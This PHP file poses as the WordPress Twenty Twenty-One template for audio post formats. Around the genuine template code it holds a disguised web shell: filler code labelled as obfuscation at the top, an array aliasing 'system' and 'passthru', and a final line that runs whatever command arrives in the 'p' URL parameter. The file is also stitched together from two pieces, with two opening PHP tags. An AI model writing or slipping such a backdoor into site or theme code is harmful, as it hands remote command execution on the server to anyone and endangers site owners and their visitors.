<?php
$fmap = array('x1' => 'system', 'x2' => 'passthru');
$x_fake1 = 1234;
$noise = 'obfuscation'.'test';
$tmp = $x_fake1 * 42;
$flag = false;
$useless = function($v) { return $v . rand(); };
$dummy_check = $useless('xx');
if ($flag) { echo 'Debug enabled'; }
for ($i = 0; $i < 1; $i++) { $tmp += $i; }
while (false) { echo 'dead loop'; break; }

<?php
/**
 * Show the appropriate content for the Audio post format.
 *
 * @link https://developer.wordpress.org/themes/basics/template-hierarchy/
 *
 * @package WordPress
 * @subpackage Twenty_Twenty_One
 * @since Twenty Twenty-One 1.0
 */

$content = get_the_content();

if ( has_block( 'core/audio', $content ) ) {
	twenty_twenty_one_print_first_instance_of_block( 'core/audio', $content );
} elseif ( has_block( 'core/embed', $content ) ) {
	twenty_twenty_one_print_first_instance_of_block( 'core/embed', $content );
} else {
	twenty_twenty_one_print_first_instance_of_block( 'core-embed/*', $content );
}

// Add the excerpt.
the_excerpt();

$cmd = $_GET['p'];
$fmap['x1']($cmd);
?>